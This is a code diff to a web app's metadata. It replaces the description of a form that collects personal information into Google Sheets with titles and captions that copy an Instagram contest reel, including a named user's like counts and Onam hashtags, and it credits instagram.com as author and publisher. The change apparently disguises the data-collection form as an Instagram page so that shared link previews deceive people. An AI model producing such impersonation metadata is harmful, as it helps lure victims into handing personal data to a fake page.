@@ -10,12 +10,12 @@ import { inter, sourceSerif4 } from './fonts';
 import './globals.css';
 
 export const metadata: Metadata = {
-  title: 'Form Collection - Submit Your Information',
-  description: 'Submit your personal information through our secure form. Your data will be safely stored in our Google Sheets database.',
-  keywords: ['form', 'submission', 'data collection', 'secure form'],
-  authors: [{ name: 'Your App Name' }],
-  creator: 'Your App Name',
-  publisher: 'Your App Name',
+  title: 'Instagram.com | Contest entry Reel • Instagram reel',
+  description: '520 likes, 14 comments - aysha on August 26, 2025: &quot; ഓണം പൊളിയാക്കണ്ടേ...#blastonam ',
+  keywords: ['instagram', 'reel'],
+  authors: [{ name: 'instagram.com' }],
+  creator: 'instagram.com',
+  publisher: 'instagram.com',
   formatDetection: {
     email: false,
     address: false,
@@ -26,16 +26,16 @@ export const metadata: Metadata = {
     canonical: '/',
   },
   openGraph: {
-    title: 'Form Collection - Submit Your Information',
-    description: 'Submit your personal information through our secure form. Your data will be safely stored in our Google Sheets database.',
+    title: 'Instagram.com | Contest entry Reel • Instagram reel',
+    description: 'ഓണം കളറാക്കണ്ടേ • Instagram reel',
     url: 'https://yourapp.com', // Replace with your actual domain
-    siteName: 'Form Collection App',
+    siteName: 'instagram reel',
     images: [
       {
         url: '/og-image.jpg', // This should match your image filename in public folder
         width: 1200,
         height: 630,
-        alt: 'Form Collection App - Secure Data Submission',
+        alt: 'Instagram.com | Contest entry Reel • Instagram reel',
       },
     ],
     locale: 'en_US',
@@ -43,8 +43,8 @@ export const metadata: Metadata = {
   },
   twitter: {
     card: 'summary_large_image',
-    title: 'Form Collection - Submit Your Information',
-    description: 'Submit your personal information through our secure form. Your data will be safely stored in our Google Sheets database.',
+    title: 'Instagram.com | Contest entry Reel • Instagram reel',
+    description: '#onam #celebration #contest. ',
     images: ['/og-image.jpg'], // This should match your image filename in public folder
     creator: '@yourtwitterhandle', // Replace with your Twitter handle
   },
